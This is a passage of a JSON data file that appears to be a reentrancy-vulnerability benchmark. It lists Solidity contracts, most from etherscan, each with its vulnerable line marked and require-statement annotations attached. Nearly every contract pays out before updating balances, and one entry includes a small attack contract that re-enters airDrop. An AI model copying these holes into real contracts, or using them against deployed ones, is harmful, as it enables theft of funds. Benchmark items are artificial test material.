            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 63\n */\n\npragma solidity ^0.4.19;\n\ncontract MONEY_BOX   \n{\n    struct Holder   \n    {\n        uint unlockTime;\n        uint balance;\n    }\n    \n    mapping (address => Holder) public Acc;\n    \n    uint public MinSum;\n    \n    Log LogFile;\n    \n    bool intitalized;\n    \n    function SetMinSum(uint _val)\n    public\n    {\n        if(intitalized)throw;\n        MinSum = _val;\n    }\n    \n    function SetLogFile(address _log)\n    public\n    {\n        if(intitalized)throw;\n        LogFile = Log(_log);\n    }\n    \n    function Initialized()\n    public\n    {\n        intitalized = true;\n    }\n    \n    function Put(uint _lockTime)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        acc.balance += msg.value;\n        if(now+_lockTime>acc.unlockTime)acc.unlockTime=now+_lockTime;\n        LogFile.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n    \n    function Collect(uint _am)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)\n        {\n\n            if(msg.sender.call.value(_am)())\n            {\n                acc.balance-=_am;\n                LogFile.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n    \n    function() \n    public \n    payable\n    {\n        Put(0);\n    }\n    \n}\n\n\ncontract Log \n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
            {
                "VL": [
                    62,
                    "require(_am<=this.balance);"
                ],
                "pre": [
                    59,
                    "require(_am>0);"
                ],
                "post": [
                    69,
                    "require(acc.balance>=MinSum);"
                ]
            }
        ]
    ],
    "0x8c7777c45481dba411450c228cb692ac3d550344.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 41\n */\n \npragma solidity ^0.4.19;\n\ncontract ETH_VAULT\n{\n    mapping (address => uint) public balances;\n    \n    Log TransferLog;\n    \n    uint public MinDeposit = 1 ether;\n    \n    function ETH_VAULT(address _log)\n    public \n    {\n        TransferLog = Log(_log);\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        if(msg.value > MinDeposit)\n        {\n            balances[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n    \n    function CashOut(uint _am)\n    public\n    payable\n    {\n        if(_am<=balances[msg.sender])\n        {\n\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                TransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n            }\n        }\n    }\n    \n    function() public payable{}    \n    \n}\n\ncontract Log \n{\n   \n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
            {
                "VL": [
                    40,
                    "require(_am<=address(this).balance);"
                ],
                "pre": [
                    38,
                    "require(_am>0);"
                ],
                "post": [
                    47,
                    "require(balances[msg.sender]>=MinDeposit);"
                ]
            }
        ]
    ],
    "0xbaf51e761510c1a11bf48dd87c0307ac8a8c8a4f.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 41\n */\n\npragma solidity ^0.4.19;\n\ncontract ETH_VAULT\n{\n    mapping (address => uint) public balances;\n    \n    uint public MinDeposit = 1 ether;\n    \n    Log TransferLog;\n    \n    function ETH_VAULT(address _log)\n    public \n    {\n        TransferLog = Log(_log);\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        if(msg.value > MinDeposit)\n        {\n            balances[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n    \n    function CashOut(uint _am)\n    public\n    payable\n    {\n        if(_am<=balances[msg.sender])\n        {\n\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                TransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n            }\n        }\n    }\n    \n    function() public payable{}    \n    \n}\n\ncontract Log \n{\n   \n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
            {
                "VL": [
                    40,
                    "require(_am<=address(this).balance);"
                ],
                "pre": [
                    38,
                    "require(_am>0);"
                ],
                "post": [
                    47,
                    "require(balances[msg.sender]>=MinDeposit);"
                ]
            }
        ]
    ],
    "reentrancy_dao.sol": [
        [
            "/*\n * @source: https://github.com/ConsenSys/evm-analyzer-benchmark-suite\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 18\n */\n\npragma solidity ^0.4.19;\n\ncontract ReentrancyDAO {\n    mapping (address => uint) credit;\n    uint balance;\n\n    function withdrawAll() public {\n        uint oCredit = credit[msg.sender];\n        if (oCredit > 0) {\n            balance -= oCredit;\n\n            bool callResult = msg.sender.call.value(oCredit)();\n            require (callResult);\n            credit[msg.sender] = 0;\n        }\n    }\n\n    function deposit() public payable {\n        credit[msg.sender] += msg.value;\n        balance += msg.value;\n    }\n}",
            {
                "VL": [
                    17,
                    "require(balance>=oCredit);"
                ],
                "pre": [
                    14,
                    "require(balance>0);"
                ],
                "post": [
                    22,
                    "require(balance>=0);"
                ]
            }
        ]
    ],
    "0x4e73b32ed6c35f570686b89848e5f39f20ecc106.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 54\n */\n\npragma solidity ^0.4.19;\n\ncontract PRIVATE_ETH_CELL\n{\n    mapping (address=>uint256) public balances;   \n   \n    uint public MinSum;\n    \n    LogFile Log;\n    \n    bool intitalized;\n    \n    function SetMinSum(uint _val)\n    public\n    {\n        require(!intitalized);\n        MinSum = _val;\n    }\n    \n    function SetLogFile(address _log)\n    public\n    {\n        require(!intitalized);\n        Log = LogFile(_log);\n    }\n    \n    function Initialized()\n    public\n    {\n        intitalized = true;\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        balances[msg.sender]+= msg.value;\n        Log.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n    \n    function Collect(uint _am)\n    public\n    payable\n    {\n        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)\n        {\n\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                Log.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n    \n    function() \n    public \n    payable\n    {\n        Deposit();\n    }\n    \n}\n\n\n\ncontract LogFile\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
            {
                "VL": [
                    53,
                    "require(balances[msg.sender]>=_am);"
                ],
                "pre": [
                    51,
                    "require(intitalized);"
                ],
                "post": [
                    60,
                    "require(balances[msg.sender]>=MinSum);"
                ]
            }
        ]
    ],
    "0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 40\n */\n\npragma solidity ^0.4.19;\n\ncontract Private_Bank\n{\n    mapping (address => uint) public balances;\n    \n    uint public MinDeposit = 1 ether;\n    \n    Log TransferLog;\n    \n    function Private_Bank(address _log)\n    {\n        TransferLog = Log(_log);\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        if(msg.value > MinDeposit)\n        {\n            balances[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n    \n    function CashOut(uint _am)\n    public\n    payable\n    {\n        if(_am<=balances[msg.sender])\n        {\n\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                TransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n            }\n        }\n    }\n    \n    function() public payable{}    \n    \n}\n\ncontract Log \n{\n   \n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
            {
                "VL": [
                    39,
                    "require(_am>=MinDeposit);"
                ],
                "pre": [
                    37,
                    "require(_am>0);"
                ],
                "post": [
                    46,
                    "require(balances[msg.sender]>=MinDeposit);"
                ]
            }
        ]
    ],
    "0x7a8721a9d64c74da899424c1b52acbf58ddc9782.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 52\n */\n\npragma solidity ^0.4.19;\n\ncontract PrivateDeposit\n{\n    mapping (address => uint) public balances;\n        \n    uint public MinDeposit = 1 ether;\n    address public owner;\n    \n    Log TransferLog;\n    \n    modifier onlyOwner() {\n        require(tx.origin == owner);\n        _;\n    }    \n    \n    function PrivateDeposit()\n    {\n        owner = msg.sender;\n        TransferLog = new Log();\n    }\n    \n    \n    \n    function setLog(address _lib) onlyOwner\n    {\n        TransferLog = Log(_lib);\n    }    \n    \n    function Deposit()\n    public\n    payable\n    {\n        if(msg.value >= MinDeposit)\n        {\n            balances[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n    \n    function CashOut(uint _am)\n    {\n        if(_am<=balances[msg.sender])\n        {            \n\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                TransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n            }\n        }\n    }\n    \n    function() public payable{}    \n    \n}\n\ncontract Log \n{\n   \n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
            {
                "VL": [
                    51,
                    "require(_am>=MinDeposit);"
                ],
                "pre": [
                    49,
                    "require(_am>0);"
                ],
                "post": [
                    58,
                    "require(balances[msg.sender]>=MinDeposit);"
                ]
            }
        ]
    ],
    "0x23a91059fdc9579a9fbd0edc5f2ea0bfdb70deb4.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 38\n */\n\npragma solidity ^0.4.19;\n\ncontract PrivateBank\n{\n    mapping (address => uint) public balances;\n    \n    uint public MinDeposit = 1 ether;\n    \n    Log TransferLog;\n    \n    function PrivateBank(address _log)\n    {\n        TransferLog = Log(_log);\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        if(msg.value >= MinDeposit)\n        {\n            balances[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n    \n    function CashOut(uint _am)\n    {\n        if(_am<=balances[msg.sender])\n        {            \n\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                TransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n            }\n        }\n    }\n    \n    function() public payable{}    \n    \n}\n\ncontract Log \n{\n   \n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
            {
                "VL": [
                    37,
                    "require(balances[msg.sender]>=_am);"
                ],
                "pre": [
                    35,
                    "require(_am>0);"
                ],
                "post": [
                    44,
                    "require(balances[msg.sender]>=MinDeposit);"
                ]
            }
        ]
    ],
    "0xf015c35649c82f5467c9c74b7f28ee67665aad68.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 29\n */\n\npragma solidity ^0.4.25;\n\ncontract MY_BANK\n{\n    function Put(uint _unlockTime)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        acc.balance += msg.value;\n        acc.unlockTime = _unlockTime>now?_unlockTime:now;\n        LogFile.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _am)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)\n        {\n\n            if(msg.sender.call.value(_am)())\n            {\n                acc.balance-=_am;\n                LogFile.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n\n    function() \n    public \n    payable\n    {\n        Put(0);\n    }\n\n    struct Holder   \n    {\n        uint unlockTime;\n        uint balance;\n    }\n\n    mapping (address => Holder) public Acc;\n\n    Log LogFile;\n\n    uint public MinSum = 1 ether;    \n\n    function MY_BANK(address log) public{\n        LogFile = Log(log);\n    }\n}\n\n\ncontract Log \n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
            {
                "VL": [
                    28,
                    "require(_am<=acc.balance);"
                ],
                "pre": [
                    25,
                    "require(msg.sender==tx.origin);"
                ],
                "post": [
                    35,
                    "require(acc.balance>=MinSum);"
                ]
            }
        ]
    ],
    "0x96edbe868531bd23a6c05e9d0c424ea64fb1b78b.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 63\n */\n\npragma solidity ^0.4.19;\n\ncontract PENNY_BY_PENNY  \n{\n    struct Holder   \n    {\n        uint unlockTime;\n        uint balance;\n    }\n    \n    mapping (address => Holder) public Acc;\n    \n    uint public MinSum;\n    \n    LogFile Log;\n    \n    bool intitalized;\n    \n    function SetMinSum(uint _val)\n    public\n    {\n        if(intitalized)throw;\n        MinSum = _val;\n    }\n    \n    function SetLogFile(address _log)\n    public\n    {\n        if(intitalized)throw;\n        Log = LogFile(_log);\n    }\n    \n    function Initialized()\n    public\n    {\n        intitalized = true;\n    }\n    \n    function Put(uint _lockTime)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        acc.balance += msg.value;\n        if(now+_lockTime>acc.unlockTime)acc.unlockTime=now+_lockTime;\n        Log.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n    \n    function Collect(uint _am)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)\n        {\n\n            if(msg.sender.call.value(_am)())\n            {\n                acc.balance-=_am;\n                Log.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n    \n    function() \n    public \n    payable\n    {\n        Put(0);\n    }\n    \n}\n\n\ncontract LogFile\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
            {
                "VL": [
                    62,
                    "require(_am<=this.balance);"
                ],
                "pre": [
                    59,
                    "require(_am>0);"
                ],
                "post": [
                    69,
                    "require(acc.balance>=MinSum);"
                ]
            }
        ]
    ],
    "0xb93430ce38ac4a6bb47fb1fc085ea669353fd89e.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 38\n */\n\npragma solidity ^0.4.19;\n\ncontract PrivateBank\n{\n    mapping (address => uint) public balances;\n        \n    uint public MinDeposit = 1 ether;\n    \n    Log TransferLog;\n    \n    function PrivateBank(address _lib)\n    {\n        TransferLog = Log(_lib);\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        if(msg.value >= MinDeposit)\n        {\n            balances[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n        }\n    }\n    \n    function CashOut(uint _am)\n    {\n        if(_am<=balances[msg.sender])\n        {            \n\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                TransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n            }\n        }\n    }\n    \n    function() public payable{}    \n    \n}\n\ncontract Log \n{\n   \n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
            {
                "VL": [
                    37,
                    "require(_am>=MinDeposit);"
                ],
                "pre": [
                    35,
                    "require(_am>0);"
                ],
                "post": [
                    44,
                    "require(balances[msg.sender]>=MinDeposit);"
                ]
            }
        ]
    ],
    "modifier_reentrancy.sol": [
        [
            "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/reentracy/modifier_reentrancy.sol\n * @author: - \n * @vulnerable_at_lines: 15\n */\n\npragma solidity ^0.4.24;\n\ncontract ModifierEntrancy {\n  mapping (address => uint) public tokenBalance;\n  string constant name = \"Nu Token\";\n\n  //If a contract has a zero balance and supports the token give them some token\n\n  function airDrop() hasNoBalance supportsToken  public{\n    tokenBalance[msg.sender] += 20;\n  }\n\n  //Checks that the contract responds the way we want\n  modifier supportsToken() {\n    require(keccak256(abi.encodePacked(\"Nu Token\")) == Bank(msg.sender).supportsToken());\n    _;\n  }\n  //Checks that the caller has a zero balance\n  modifier hasNoBalance {\n      require(tokenBalance[msg.sender] == 0);\n      _;\n  }\n}\n\ncontract Bank{\n    function supportsToken() external pure returns(bytes32){\n        return(keccak256(abi.encodePacked(\"Nu Token\")));\n    }\n}\n\ncontract attack{ //An example of a contract that breaks the contract above.\n    bool hasBeenCalled;\n    function supportsToken() external returns(bytes32){\n        if(!hasBeenCalled){\n            hasBeenCalled = true;\n            ModifierEntrancy(msg.sender).airDrop();\n        }\n        return(keccak256(abi.encodePacked(\"Nu Token\")));\n    }\n    function call(address token) public{\n        ModifierEntrancy(token).airDrop();\n    }\n}",
            {
                "VL": [
                    14,
                    "require(tokenBalance[msg.sender]>0);"
                ],
                "pre": [
                    10,
                    "require(msg.sender==tx.origin);"
                ],
                "post": [
                    29,
                    "require(tokenBalance[msg.sender]==0);"
                ]
            }
        ]
    ],
    "reentrancy_bonus.sol": [
        [
            "/*\n * @source: https://consensys.github.io/smart-contract-best-practices/known_attacks/\n * @author: consensys\n * @vulnerable_at_lines: 28\n */\n\npragma solidity ^0.4.24;\n\ncontract Reentrancy_bonus{\n\n    // INSECURE\n    mapping (address => uint) private userBalances;\n    mapping (address => bool) private claimedBonus;\n    mapping (address => uint) private rewardsForA;\n\n    function withdrawReward(address recipient) public {\n        uint amountToWithdraw = rewardsForA[recipient];\n        rewardsForA[recipient] = 0;\n        (bool success, ) = recipient.call.value(amountToWithdraw)(\"\");\n        require(success);\n    }\n\n    function getFirstWithdrawalBonus(address recipient) public {\n        require(!claimedBonus[recipient]); // Each recipient should only be able to claim the bonus once\n        rewardsForA[recipient] += 100;\n\n        withdrawReward(recipient); // At this point, the caller will be able to execute getFirstWithdrawalBonus again.\n        claimedBonus[recipient] = true;\n    }\n}",
            {
                "VL": [
                    26,
                    "require(userBalances[recipient]>=100);"
                ],
                "pre": [
                    24,
                    "require(userBalances[recipient]>0);"
                ],
                "post": [
                    29,
                    "require(userBalances[recipient]>=100);"
                ]
            }
        ]
    ],
    "simple_dao.sol": [
        [
            "/*\n * @source: http://blockchain.unica.it/projects/ethereum-survey/attacks.html#simpledao\n * @author: -\n * @vulnerable_at_lines: 19\n */\n\npragma solidity ^0.4.2;\n\ncontract SimpleDAO {\n  mapping (address => uint) public credit;\n\n  function donate(address to) payable {\n    credit[to] += msg.value;\n  }\n\n  function withdraw(uint amount) {\n    if (credit[msg.sender]>= amount) {\n\n      bool res = msg.sender.call.value(amount)();\n      credit[msg.sender]-=amount;\n    }\n  }\n\n  function queryCredit(address to) returns (uint){\n    return credit[to];\n  }\n}",
            {
                "VL": [
                    18,
                    "require(amount<=this.balance);"
                ],
                "pre": [
                    17,
                    "require(amount>0);"
                ],
                "post": [
                    22,
                    "require(res);"
                ]
            }
        ]
    ],
    "0x941d225236464a25eb18076df7da6a91d0f95e9e.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44\n */\n\npragma solidity ^0.4.19;\n\ncontract ETH_FUND\n{\n    mapping (address => uint) public balances;\n    \n    uint public MinDeposit = 1 ether;\n    \n    Log TransferLog;\n    \n    uint lastBlock;\n    \n    function ETH_FUND(address _log)\n    public \n    {\n        TransferLog = Log(_log);\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        if(msg.value > MinDeposit)\n        {\n            balances[msg.sender]+=msg.value;\n            TransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n            lastBlock = block.number;\n        }\n    }\n    \n    function CashOut(uint _am)\n    public\n    payable\n    {\n        if(_am<=balances[msg.sender]&&block.number>lastBlock)\n        {\n\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                TransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n            }\n        }\n    }\n    \n    function() public payable{}    \n    \n}\n\ncontract Log \n{\n   \n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
            {
                "VL": [
                    43,
                    "require(_am<=address(this).balance);"
                ],
                "pre": [
                    41,
                    "require(_am>0);"
                ],
                "post": [
                    50,
                    "require(false);"
                ]
            }
        ]
    ],
    "reentrancy_simple.sol": [
        [
            "/*\n * @source: https://github.com/trailofbits/not-so-smart-contracts/blob/master/reentrancy/Reentrancy.sol\n * @author: -\n * @vulnerable_at_lines: 24\n */\n\n pragma solidity ^0.4.15;\n\n contract Reentrance {\n     mapping (address => uint) userBalance;\n\n     function getBalance(address u) constant returns(uint){\n         return userBalance[u];\n     }\n\n     function addToBalance() payable{\n         userBalance[msg.sender] += msg.value;\n     }\n\n     function withdrawBalance(){\n         // send userBalance[msg.sender] ethers to msg.sender\n         // if mgs.sender is a contract, it will call its fallback function\n\n         if( ! (msg.sender.call.value(userBalance[msg.sender])() ) ){\n             throw;\n         }\n         userBalance[msg.sender] = 0;\n     }\n }",
            {
                "VL": [
                    23,
                    "require(userBalance[msg.sender]>0);"
                ],
                "pre": [
                    21,
                    "require(userBalance[msg.sender]>0);"
                ],
                "post": [
                    28,
                    "require(userBalance[msg.sender]==0);"
                ]
            }
        ]
    ],
    "0x7b368c4e805c3870b6c49a3f1f49f69af8662cf3.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 29\n */\n\npragma solidity ^0.4.25;\n\ncontract W_WALLET\n{\n    function Put(uint _unlockTime)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        acc.balance += msg.value;\n        acc.unlockTime = _unlockTime>now?_unlockTime:now;\n        LogFile.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _am)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)\n        {\n\n            if(msg.sender.call.value(_am)())\n            {\n                acc.balance-=_am;\n                LogFile.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n\n    function() \n    public \n    payable\n    {\n        Put(0);\n    }\n\n    struct Holder   \n    {\n        uint unlockTime;\n        uint balance;\n    }\n\n    mapping (address => Holder) public Acc;\n\n    Log LogFile;\n\n    uint public MinSum = 1 ether;    \n\n    function W_WALLET(address log) public{\n        LogFile = Log(log);\n    }\n}\n\n\ncontract Log \n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
            {
                "VL": [
                    28,
                    "require(_am<=acc.balance);"
                ],
                "pre": [
                    25,
                    "require(msg.sender==tx.origin);"
                ],
                "post": [
                    35,
                    "require(acc.balance>=MinSum);"
                ]
            }
        ]
    ],
    "0xaae1f51cf3339f18b6d3f3bdc75a5facd744b0b8.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 54\n */\n\npragma solidity ^0.4.19;\n\ncontract DEP_BANK \n{\n    mapping (address=>uint256) public balances;   \n   \n    uint public MinSum;\n    \n    LogFile Log;\n    \n    bool intitalized;\n    \n    function SetMinSum(uint _val)\n    public\n    {\n        if(intitalized)throw;\n        MinSum = _val;\n    }\n    \n    function SetLogFile(address _log)\n    public\n    {\n        if(intitalized)throw;\n        Log = LogFile(_log);\n    }\n    \n    function Initialized()\n    public\n    {\n        intitalized = true;\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        balances[msg.sender]+= msg.value;\n        Log.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n    \n    function Collect(uint _am)\n    public\n    payable\n    {\n        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)\n        {\n\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                Log.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n    \n    function() \n    public \n    payable\n    {\n        Deposit();\n    }\n    \n}\n\n\ncontract LogFile\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
            {
                "VL": [
                    53,
                    "require(balances[msg.sender]>=_am);"
                ],
                "pre": [
                    51,
                    "require(intitalized);"
                ],
                "post": [
                    60,
                    "require(balances[msg.sender]>=MinSum);"
                ]
            }
        ]
    ],
    "0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 54\n */\n\npragma solidity ^0.4.19;\n\ncontract PERSONAL_BANK\n{\n    mapping (address=>uint256) public balances;   \n   \n    uint public MinSum = 1 ether;\n    \n    LogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);\n    \n    bool intitalized;\n    \n    function SetMinSum(uint _val)\n    public\n    {\n        if(intitalized)revert();\n        MinSum = _val;\n    }\n    \n    function SetLogFile(address _log)\n    public\n    {\n        if(intitalized)revert();\n        Log = LogFile(_log);\n    }\n    \n    function Initialized()\n    public\n    {\n        intitalized = true;\n    }\n    \n    function Deposit()\n    public\n    payable\n    {\n        balances[msg.sender]+= msg.value;\n        Log.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n    \n    function Collect(uint _am)\n    public\n    payable\n    {\n        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)\n        {\n\n            if(msg.sender.call.value(_am)())\n            {\n                balances[msg.sender]-=_am;\n                Log.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n    \n    function() \n    public \n    payable\n    {\n        Deposit();\n    }\n    \n}\n\n\n\ncontract LogFile\n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n    \n    Message[] public History;\n    \n    Message LastMsg;\n    \n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
            {
                "VL": [
                    53,
                    "require(balances[msg.sender]>=_am);"
                ],
                "pre": [
                    51,
                    "require(balances[msg.sender]>=MinSum);"
                ],
                "post": [
                    60,
                    "require(balances[msg.sender]>=MinSum);"
                ]
            }
        ]
    ],
    "etherstore.sol": [
        [
